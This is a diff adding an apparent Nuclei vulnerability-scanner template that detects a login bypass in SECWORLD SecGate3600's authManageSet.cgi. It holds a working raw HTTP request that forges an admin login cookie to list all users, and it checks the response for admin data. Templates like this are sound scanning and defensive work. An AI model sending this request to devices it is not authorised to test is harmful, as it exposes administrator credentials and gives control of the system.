@@ -1,0 +1,30 @@
+id: secgate3600-login-bypass
+info:
+  name: SECWORLD SecGate3600 authManageSet.cgi Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    SecGate3600 has a login bypass vulnerability allowing attackers to obtain sensitive information such as administrator passwords and control the system further.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2018-18297
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: sw_login_name=admin
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 105
+
+        type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</cell>"
+          - "admin"
+        part: body
